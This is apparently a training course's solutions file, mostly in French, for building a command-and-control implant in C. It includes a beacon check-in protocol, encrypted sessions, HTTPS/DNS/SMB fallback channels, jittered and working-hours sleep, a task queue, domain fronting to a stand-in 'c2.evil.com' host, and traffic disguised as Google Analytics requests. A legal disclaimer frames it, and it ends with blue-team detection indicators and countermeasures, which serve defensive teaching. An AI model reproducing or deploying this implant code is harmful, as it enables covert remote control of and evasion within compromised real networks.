SOLUTIONS - Module 45 : C2 Development

AVERTISSEMENT LEGAL : Solutions THEORIQUES ou LAB ISOLE uniquement. Deployment
C2 reel sans autorisation = CRIME FEDERAL. Contenu educatif red team/blue team.

Solution 1 : Protocol Design (IMPLEMENTATION LAB)

Conception protocole C2 custom avec structure messages.

```c
// Protocol message structures
typedef enum {
    MSG_CHECKIN = 0x01,
    MSG_TASK_REQUEST = 0x02,
    MSG_TASK_RESPONSE = 0x03,
    MSG_HEARTBEAT = 0x04,
    MSG_EXIT = 0xFF
} MessageType;

typedef struct {
    uint32_t magic;           // 0xC2C2C2C2
    uint8_t version;          // Protocol version
    MessageType type;
    uint32_t beacon_id;
    uint32_t length;          // Payload length
    uint32_t checksum;        // CRC32 payload
    // Payload follows
} C2Header;

typedef struct {
    char hostname[256];
    char username[64];
    char os_version[128];
    uint32_t pid;
    uint32_t ppid;
    uint16_t integrity_level;  // Low/Medium/High/System
    time_t first_seen;
} BeaconCheckin;

typedef struct {
    uint32_t task_id;
    uint8_t command_type;      // CMD_SHELL, CMD_UPLOAD, CMD_DOWNLOAD, etc.
    uint32_t command_length;
    char command_data[1];      // Variable length
} Task;

typedef struct {
    uint32_t task_id;
    uint8_t status;            // SUCCESS, FAILURE, IN_PROGRESS
    uint32_t output_length;
    char output_data[1];       // Variable length
} TaskResponse;

// Serialization
int serialize_checkin(BeaconCheckin* checkin, unsigned char* buffer, size_t buffer_size) {
    if (buffer_size < sizeof(C2Header) + sizeof(BeaconCheckin)) {
        return -1;
    }

    C2Header* header = (C2Header*)buffer;
    header->magic = 0xC2C2C2C2;
    header->version = 1;
    header->type = MSG_CHECKIN;
    header->beacon_id = rand();  // Generate unique ID
    header->length = sizeof(BeaconCheckin);

    memcpy(buffer + sizeof(C2Header), checkin, sizeof(BeaconCheckin));

    // Calculate checksum
    header->checksum = crc32(buffer + sizeof(C2Header), sizeof(BeaconCheckin));

    return sizeof(C2Header) + sizeof(BeaconCheckin);
}
```

Solution 2 : Encryption Implementation (LAB ISOLE)

AES-256-CBC avec key exchange pour communications securisees.

```c
#include <openssl/aes.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/rand.h>
#include <openssl/evp.h>
#include <openssl/hmac.h>

typedef struct {
    unsigned char aes_key[32];    // 256-bit key
    unsigned char iv[16];         // Initialization vector
    unsigned char hmac_key[32];   // HMAC key
} SessionKeys;

// Generate session keys
int generate_session_keys(SessionKeys* keys) {
    if (RAND_bytes(keys->aes_key, sizeof(keys->aes_key)) != 1) {
        return -1;
    }
    if (RAND_bytes(keys->iv, sizeof(keys->iv)) != 1) {
        return -1;
    }
    if (RAND_bytes(keys->hmac_key, sizeof(keys->hmac_key)) != 1) {
        return -1;
    }
    return 0;
}

// AES-256-CBC encryption
int aes_encrypt(const unsigned char* plaintext, size_t plaintext_len,
                SessionKeys* keys, unsigned char* ciphertext, size_t* ciphertext_len) {
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return -1;

    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, keys->aes_key, keys->iv) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }

    int len;
    if (EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }
    *ciphertext_len = len;

    if (EVP_EncryptFinal_ex(ctx, ciphertext + len, &len) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }
    *ciphertext_len += len;

    EVP_CIPHER_CTX_free(ctx);
    return 0;
}

// HMAC-SHA256 for integrity
int compute_hmac(const unsigned char* data, size_t data_len,
                 SessionKeys* keys, unsigned char* hmac, unsigned int* hmac_len) {
    return HMAC(EVP_sha256(), keys->hmac_key, sizeof(keys->hmac_key),
                data, data_len, hmac, hmac_len) != NULL ? 0 : -1;
}

// RSA key exchange (beacon encrypts session key with C2 public key)
int exchange_session_key(RSA* c2_public_key, SessionKeys* keys,
                         unsigned char* encrypted_key, int* encrypted_len) {
    // Serialize session keys
    unsigned char key_data[sizeof(SessionKeys)];
    memcpy(key_data, keys, sizeof(SessionKeys));

    // Encrypt with RSA public key
    *encrypted_len = RSA_public_encrypt(sizeof(SessionKeys), key_data,
                                        encrypted_key, c2_public_key,
                                        RSA_PKCS1_OAEP_PADDING);

    return (*encrypted_len > 0) ? 0 : -1;
}
```

Solution 3 : Multi-Protocol Beacon (LAB ISOLE)

Beacon avec fallback HTTPS -> DNS -> SMB.

```c
typedef enum {
    PROTO_HTTPS = 1,
    PROTO_DNS = 2,
    PROTO_SMB = 3
} ProtocolType;

typedef struct {
    ProtocolType type;
    int (*connect)(void* config);
    int (*send)(void* config, const char* data, size_t len);
    int (*recv)(void* config, char* buffer, size_t buffer_size);
    void (*disconnect)(void* config);
} Protocol;

// HTTPS implementation
int https_connect(void* config) {
    // Implementation OpenSSL TLS connection
    // ...
    return 0;
}

int https_send(void* config, const char* data, size_t len) {
    // POST request avec data encrypted
    // ...
    return 0;
}

// DNS implementation
int dns_connect(void* config) {
    // DNS resolver initialization
    return 0;
}

int dns_send(void* config, const char* data, size_t len) {
    // Encode data in DNS subdomain
    // Example: <base32_data>.example.com
    char encoded[256];
    base32_encode(data, len, encoded, sizeof(encoded));

    // Send DNS query
    // res_query(encoded, C_IN, T_TXT, ...);

    return 0;
}

// SMB implementation
int smb_connect(void* config) {
    // Connect to named pipe
    // \\\\server\\pipe\\pipename
    return 0;
}

// Protocol selection logic
Protocol* select_protocol(Protocol* protocols, int protocol_count) {
    for (int i = 0; i < protocol_count; i++) {
        printf("[*] Trying protocol %d...\n", protocols[i].type);

        if (protocols[i].connect(NULL) == 0) {
            printf("[+] Protocol %d connected\n", protocols[i].type);
            return &protocols[i];
        }

        printf("[!] Protocol %d failed\n", protocols[i].type);
    }

    return NULL;  // All protocols failed
}

// Multi-protocol beacon
void multi_protocol_beacon(void) {
    Protocol protocols[] = {
        {PROTO_HTTPS, https_connect, https_send, https_recv, https_disconnect},
        {PROTO_DNS, dns_connect, dns_send, dns_recv, dns_disconnect},
        {PROTO_SMB, smb_connect, smb_send, smb_recv, smb_disconnect}
    };

    Protocol* active_proto = select_protocol(protocols, 3);

    if (!active_proto) {
        printf("[!] All protocols failed\n");
        return;
    }

    // Use active protocol for communication
    active_proto->send(NULL, "beacon_data", 11);
}
```

Solution 4 : Sleep & Jitter Advanced (LAB ISOLE)

Sleep sophistique avec working hours et adaptive timing.

```c
typedef struct {
    int base_sleep;           // Base sleep seconds
    int jitter_percent;       // Jitter percentage
    int working_hours_only;   // 1 = only beacon during work hours
    int adaptive;             // 1 = adapt sleep based on activity
    time_t kill_date;         // Self-destruct after this date
} SleepConfig;

int calculate_advanced_sleep(SleepConfig* config, int last_task_received) {
    time_t now = time(NULL);

    // Check kill date
    if (config->kill_date > 0 && now >= config->kill_date) {
        printf("[!] Kill date reached - self-destructing\n");
        exit(0);
    }

    // Working hours check (9 AM - 5 PM weekdays)
    if (config->working_hours_only) {
        struct tm* timeinfo = localtime(&now);

        // Weekend check
        if (timeinfo->tm_wday == 0 || timeinfo->tm_wday == 6) {
            printf("[*] Weekend - sleeping until Monday\n");
            return 3600 * 24;  // Sleep 24 hours
        }

        // Off-hours check
        if (timeinfo->tm_hour < 9 || timeinfo->tm_hour >= 17) {
            int hours_until_9am = (9 - timeinfo->tm_hour + 24) % 24;
            printf("[*] Off-hours - sleeping %d hours\n", hours_until_9am);
            return hours_until_9am * 3600;
        }
    }

    // Adaptive sleep (longer if no tasks)
    int sleep_time = config->base_sleep;
    if (config->adaptive && !last_task_received) {
        sleep_time *= 2;  // Double sleep if idle
        printf("[*] No recent tasks - adaptive sleep: %d sec\n", sleep_time);
    }

    // Apply jitter
    int jitter_range = (sleep_time * config->jitter_percent) / 100;
    int jitter = (rand() % (2 * jitter_range + 1)) - jitter_range;

    return sleep_time + jitter;
}
```

Solution 5 : Task Queue System (LAB ISOLE)

Queue commandes avec priorities et retry logic.

```c
typedef enum {
    PRIORITY_LOW = 1,
    PRIORITY_NORMAL = 2,
    PRIORITY_HIGH = 3,
    PRIORITY_URGENT = 4
} TaskPriority;

typedef struct Task {
    uint32_t task_id;
    TaskPriority priority;
    char command[4096];
    time_t created;
    time_t expires;
    int retry_count;
    int max_retries;
    struct Task* next;
} Task;

typedef struct {
    Task* head;
    int count;
    pthread_mutex_t lock;
} TaskQueue;

// Initialize queue
void init_task_queue(TaskQueue* queue) {
    queue->head = NULL;
    queue->count = 0;
    pthread_mutex_init(&queue->lock, NULL);
}

// Add task (sorted by priority)
void add_task(TaskQueue* queue, Task* task) {
    pthread_mutex_lock(&queue->lock);

    // Insert sorted by priority
    if (!queue->head || task->priority > queue->head->priority) {
        task->next = queue->head;
        queue->head = task;
    } else {
        Task* current = queue->head;
        while (current->next && current->next->priority >= task->priority) {
            current = current->next;
        }
        task->next = current->next;
        current->next = task;
    }

    queue->count++;
    pthread_mutex_unlock(&queue->lock);
}

// Get next task
Task* get_next_task(TaskQueue* queue) {
    pthread_mutex_lock(&queue->lock);

    Task* task = queue->head;
    if (task) {
        // Check expiration
        time_t now = time(NULL);
        if (task->expires > 0 && now > task->expires) {
            // Task expired - remove and skip
            queue->head = task->next;
            free(task);
            pthread_mutex_unlock(&queue->lock);
            return get_next_task(queue);  // Try next
        }

        queue->head = task->next;
        queue->count--;
    }

    pthread_mutex_unlock(&queue->lock);
    return task;
}

// Server-side: Queue tasks for beacon
void server_queue_task(uint32_t beacon_id, const char* command,
                       TaskPriority priority, int timeout_sec) {
    Task* task = malloc(sizeof(Task));
    task->task_id = rand();
    task->priority = priority;
    strncpy(task->command, command, sizeof(task->command) - 1);
    task->created = time(NULL);
    task->expires = (timeout_sec > 0) ? task->created + timeout_sec : 0;
    task->retry_count = 0;
    task->max_retries = 3;
    task->next = NULL;

    // Add to beacon's task queue
    TaskQueue* queue = get_beacon_queue(beacon_id);
    add_task(queue, task);

    printf("[+] Task %u queued for beacon %u (priority: %d)\n",
           task->task_id, beacon_id, priority);
}
```

Solution 6 : Obfuscation & Stealth (LAB ISOLE)

Domain fronting et traffic obfuscation.

```c
// Domain fronting configuration
typedef struct {
    char front_domain[256];    // Cloudflare/CDN domain (example.cloudfront.net)
    char real_domain[256];     // Real C2 domain (c2.evil.com)
    char cdn_provider[64];     // "cloudflare", "cloudfront", "azure"
} DomainFrontConfig;

int domain_fronting_request(DomainFrontConfig* config, const char* data) {
    // HTTPS request avec Host header mismatch

    // TLS SNI: front_domain (passes inspection)
    // HTTP Host: real_domain (routes to real C2)

    CURL* curl = curl_easy_init();

    // Set SNI to front domain
    curl_easy_setopt(curl, CURLOPT_URL, config->front_domain);

    // But set Host header to real domain
    struct curl_slist* headers = NULL;
    char host_header[512];
    snprintf(host_header, sizeof(host_header), "Host: %s", config->real_domain);
    headers = curl_slist_append(headers, host_header);

    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    // Send request
    curl_easy_perform(curl);

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);

    return 0;
}

// Traffic mimicking (Google Analytics-like)
void generate_ga_like_request(char* url, size_t url_size, const char* c2_data) {
    // Mimic Google Analytics request structure
    // /collect?v=1&tid=UA-XXXXX-Y&cid=555&t=pageview&...

    char encoded_data[1024];
    base64_encode(c2_data, strlen(c2_data), encoded_data, sizeof(encoded_data));

    snprintf(url, url_size,
             "/collect?v=1&tid=UA-12345-1&cid=%d&t=pageview&dp=%%2F&dl=%s",
             rand(), encoded_data);
}

// User-Agent randomization
const char* get_random_user_agent(void) {
    const char* user_agents[] = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X)",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
    };

    int index = rand() % (sizeof(user_agents) / sizeof(user_agents[0]));
    return user_agents[index];
}
```

POINTS CLES DEVELOPPEMENT C2

1. Encryption = mandatory (AES-256 minimum)
2. Protocols multiples = resiliency
3. Obfuscation traffic = evasion detection
4. Jitter/adaptive sleep = avoid beaconing patterns
5. Error handling robust = stability

DETECTION PAR BLUE TEAM

Network Signatures:
- Regularity beacon callbacks (meme avec jitter)
- High entropy payloads (encrypted)
- TLS anomalies (self-signed certs, JA3)
- DNS tunneling patterns (long subdomains)
- HTTP anomalies (suspicious URIs, headers)

Host Indicators:
- Unusual network connections (non-browser processes)
- Process injection (memory-only execution)
- Persistence mechanisms (registry, scheduled tasks)
- Credential access (LSASS reading)
- Lateral movement attempts

Behavioral:
- Dormant periods then activity bursts
- Data staging (large file aggregation)
- Exfiltration patterns (repeated uploads)
- Command execution (cmd.exe, powershell.exe children)

CONTRE-MESURES

Detection Stack:
1. NGFW avec TLS inspection
2. IDS/IPS (Snort, Suricata) avec C2 rules
3. EDR avec behavioral analytics
4. Network traffic analysis (Zeek, Moloch)
5. DNS filtering (Pi-hole, Cisco Umbrella)
6. SIEM avec correlation rules

Prevention:
7. Application whitelisting (WDAC, AppLocker)
8. Network segmentation (micro-segmentation)
9. Least privilege enforcement
10. Disable unnecessary protocols (SMBv1, LLMNR)
11. Outbound firewall rules (allow-list)

Response:
12. Automated containment (isolate infected hosts)
13. Threat hunting (proactive IOC search)
14. Forensic analysis (understand attack scope)
15. Incident response playbook C2 detection

NE JAMAIS OUBLIER : C2 development = competence red team AVANCEE necessitant
autorisation legale FORMELLE. Usage malveillant = consequences legales GRAVES
(prison, amendes massives, carriere detruite). Strictement educatif/contractuel.
